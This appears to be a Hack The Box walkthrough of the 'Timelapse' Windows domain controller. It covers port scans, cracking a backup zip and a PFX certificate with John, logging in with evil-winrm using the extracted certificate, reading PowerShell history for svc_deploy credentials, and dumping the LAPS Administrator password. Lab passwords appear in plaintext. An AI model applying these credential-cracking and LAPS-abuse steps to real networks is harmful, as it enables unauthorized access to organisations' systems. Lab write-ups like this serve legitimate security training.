---
title: "Timelapse"
date: 2024-03-17
categories: HTB
tags: ["htb walkthrough", "ctf", "cybersecurity", "hackthebox", "htb writeup", "timelapse", "penetration testing", "writeup", "htb"]
---

# Timelapse

# Timelapse

# Credentials
| Username      | Password                 | Hash | Source               |
| ------------- | ------------------------ | ---- | -------------------- |
|               | supremelegacy            |      | winrm_backup.zip     |
|               | thuglegacy               |      | legacyy_dev_auth.pfx |
| svc_deploy    | E3R$Q62^12p7PLlC%KWaxuaV |      |                      |
| Administrator | 55T{8XL047sxk(5Iv}fK3o02 |      |                      |
# Todo
- [ ] 
# Enumeration
- SMB contains password-protected `winrm_backup.zip` file.
	-  Crack the file using *zip2john*
- The output is a pfx file which contains an SSL certificate in `PKCS#12` format and a private key. PFX file can be used by WinRM in order to login without a password. 
	- Use *pfx3john* to convert the `.pfx` into hash format and use *john* to crack the password. 
	- Extract the SSL certificate and private key from the `.pfx` file.

## Nmap
# TCP
```sh
Nmap scan report for 10.10.11.152
Host is up, received user-set (0.018s latency).
Scanned at 2024-08-11 11:50:01 AEST for 634s
Not shown: 65518 filtered tcp ports (no-response)
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain?       syn-ack
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-08-11 09:51:03Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
5986/tcp  open  ssl/http      syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2024-08-11T10:00:32+00:00; +7h59m57s from scanner time.
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Issuer: commonName=dc01.timelapse.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-10-25T14:05:29
| Not valid after:  2022-10-25T14:25:29
| MD5:   e233:a199:4504:0859:013f:b9c5:e4f6:91c3
| SHA-1: 5861:acf7:76b8:703f:d01e:e25d:fc7c:9952:a447:7652
| -----BEGIN CERTIFICATE-----
| MIIDCjCCAfKgAwIBAgIQLRY/feXALoZCPZtUeyiC4DANBgkqhkiG9w0BAQsFADAd
| MRswGQYDVQQDDBJkYzAxLnRpbWVsYXBzZS5odGIwHhcNMjExMDI1MTQwNTI5WhcN
| MjIxMDI1MTQyNTI5WjAdMRswGQYDVQQDDBJkYzAxLnRpbWVsYXBzZS5odGIwggEi
| MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDJdoIQMYt47skzf17SI7M8jubO
| rD6sHg8yZw0YXKumOd5zofcSBPHfC1d/jtcHjGSsc5dQQ66qnlwdlOvifNW/KcaX
| LqNmzjhwL49UGUw0MAMPAyi1hcYP6LG0dkU84zNuoNMprMpzya3+aU1u7YpQ6Dui
| AzNKPa+6zJzPSMkg/TlUuSN4LjnSgIV6xKBc1qhVYDEyTUsHZUgkIYtN0+zvwpU5
| isiwyp9M4RYZbxe0xecW39hfTvec++94VYkH4uO+ITtpmZ5OVvWOCpqagznTSXTg
| FFuSYQTSjqYDwxPXHTK+/GAlq3uUWQYGdNeVMEZt+8EIEmyL4i4ToPkqjPF1AgMB
| AAGjRjBEMA4GA1UdDwEB/wQEAwIFoDATBgNVHSUEDDAKBggrBgEFBQcDATAdBgNV
| HQ4EFgQUZ6PTTN1pEmDFD6YXfQ1tfTnXde0wDQYJKoZIhvcNAQELBQADggEBAL2Y
| /57FBUBLqUKZKp+P0vtbUAD0+J7bg4m/1tAHcN6Cf89KwRSkRLdq++RWaQk9CKIU
| 4g3M3stTWCnMf1CgXax+WeuTpzGmITLeVA6L8I2FaIgNdFVQGIG1nAn1UpYueR/H
| NTIVjMPA93XR1JLsW601WV6eUI/q7t6e52sAADECjsnG1p37NjNbmTwHabrUVjBK
| 6Luol+v2QtqP6nY4DRH+XSk6xDaxjfwd5qN7DvSpdoz09+2ffrFuQkxxs6Pp8bQE
| 5GJ+aSfE+xua2vpYyyGxO0Or1J2YA1CXMijise2tp+m9JBQ1wJ2suUS2wGv1Tvyh
| lrrndm32+d0YeP/wb8E=
|_-----END CERTIFICATE-----
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack Microsoft Windows RPC
49695/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

```

# UDP
```sh
PORT      STATE         SERVICE      VERSION
53/udp    open          domain       Simple DNS Plus
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   open          ntp          NTP v3
135/udp   open|filtered msrpc
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   open|filtered snmp
162/udp   open|filtered snmptrap
445/udp   open|filtered microsoft-ds
500/udp   open|filtered isakmp
514/udp   open|filtered syslog
520/udp   open|filtered route
631/udp   open|filtered ipp
1434/udp  open|filtered ms-sql-m
1900/udp  open|filtered upnp
4500/udp  open|filtered nat-t-ike
49152/udp open|filtered unknown
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## SMB
## Notes


## Attempts
![[/assets/images/timelapse1.png]]

```json
{
    "Shares": {
        "Dev/winrm_backup.zip": {
            "atime_epoch": "2022-03-04 19:00:38",
            "ctime_epoch": "2021-10-26 02:48:14",
            "mtime_epoch": "2021-10-26 08:05:30",
            "size": "2.55 KB"
        },
        "HelpDesk/LAPS.x64.msi": {
            "atime_epoch": "2021-10-26 02:48:42",
            "ctime_epoch": "2021-10-26 02:48:42",
            "mtime_epoch": "2021-10-26 02:55:14",
            "size": "1.07 MB"
        },
        "HelpDesk/LAPS_Datasheet.docx": {
            "atime_epoch": "2021-10-26 02:48:42",
            "ctime_epoch": "2021-10-26 02:48:42",
            "mtime_epoch": "2021-10-26 02:55:14",
            "size": "101.97 KB"
        },
        "HelpDesk/LAPS_OperationsGuide.docx": {
            "atime_epoch": "2021-10-26 02:48:42",
            "ctime_epoch": "2021-10-26 02:48:42",
            "mtime_epoch": "2021-10-26 02:55:14",
            "size": "626.35 KB"
        },
        "HelpDesk/LAPS_TechnicalSpecification.docx": {
            "atime_epoch": "2021-10-26 02:48:42",
            "ctime_epoch": "2021-10-26 02:48:42",
            "mtime_epoch": "2021-10-26 02:55:14",
            "size": "70.98 KB"
        }
    }
}
```

## winrm_backup.zip
![[/assets/images/timelapse2.png]]

```sh
zip2john winrm_backup.zip > hash
john -w=/usr/share/wordlists/rockyou.txt hash
```

![[/assets/images/timelapse3.png]]
### legacyy_dev_auth.pfx
![[/assets/images/timelapse4.png]]

The output is a PFX file which contains an SSL certificate in PKCS#12 format and a private key. PFX files can be used by WinRM in order to login without a password. Let's extract them from the file.

```sh
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
```
![[/assets/images/timelapse11.png]]

The output above shows that we need a different password than supremelegacy . Utilizing the *pfx2john* utility we convert the pfx file into a hash format then use John to crack the password. Using the following command we are able to successfully crack the password to the pfx file.

```sh
python3 /usr/share/john/pfx2john.py legacyy_dev_auth.pfx > pfx.john

john pfx.john -w=/usr/share/wordlists/rockyou.txt
```

![[/assets/images/timelapse12.png]]

Once the password is cracked we extract the SSL certificate and private key from the pfx file using the following commands.

```sh
# extract the private key from the pfx file
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes

# extract the SSL certificate from the pfx file
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
```

![[/assets/images/timelapse13.png]]

![[/assets/images/timelapse14.png]]










### LAPS_Datasheet.docx
![[/assets/images/timelapse5.png]]
### LAPS_OperationsGuide.docx


## LAPS_TechnicalSpecifications.docx
![[/assets/images/timelapse6.png]]

## LDAP
```sh
ldapsearch -x -H ldap://10.10.11.152 -D '' -w '' -b "DC=timelapse,DC=htb" > tmp
```

```sh
# copy paste the output into tmp and show unique items (anomaly) 
cat tmp | awk '{print $1}' | sort | uniq -c | sort -nr
```

![[/assets/images/timelapse9.png]]


# Initial Access
- Evil-winrm using the certificate and private key. 

## Attempts
### Extract Keys
```sh
# dump the key
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key-enc

# decrypt the key
openssl rsa -in legacyy_dev_auth.key-enc -out legacyy_dev_auth.key

# dump the certificate
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt
```

![[/assets/images/timelapse15.png]]
### Evil-winrm
```sh
evil-winrm -i 10.10.11.152 -c cert.pem -k key.pem 

# this worked
evil-winrm -i timelapse.htb -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt
```

![[/assets/images/timelapse16.png]]


# Lateral Movement
- The command line history shows new login credentials. 
- Evil-winrm using the obtained credentials `svc_deploy`.
# Privilege Escalation
- `svc_deploy` is a member of `LAPS_Readers` group.
- Running `Get-ADComputer DC01 -property 'ms-mcs-admpwd'` shows the password for the administrator.
- Evil-winrm as admin. 
 
 ## Enumeration
```powershell
# Read history
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

![[/assets/images/timelapse19.png]]
## Notes
```text
svc_deploy : E3R$Q62^12p7PLlC%KWaxuaV
```

## Attempts
### WinPEAS
Program 'peas.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted software.
![[/assets/images/timelapse17.png]]
## Evil-winrm as `svc_deploy`
```sh
evil-winrm -i 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
```

![[/assets/images/timelapse20.png]]

![[/assets/images/timelapse21.png]]
-> *LAPS_Readers* group. 

The "Local Administrator Password Solution" (LAPS) is used to manage local account passwords of Active Directory computers. 
### Read Password
```powershell
Get-ADComputer DC01 -property 'ms-mcs-admpwd'
```

![[/assets/images/timelapse22.png]]
## Evil-winrm as admin
```sh
evil-winrm -i timelapse.htb -S -u administrator -p '55T{8XL047sxk(5Iv}fK3o02'
```

![[/assets/images/timelapse23.png]]

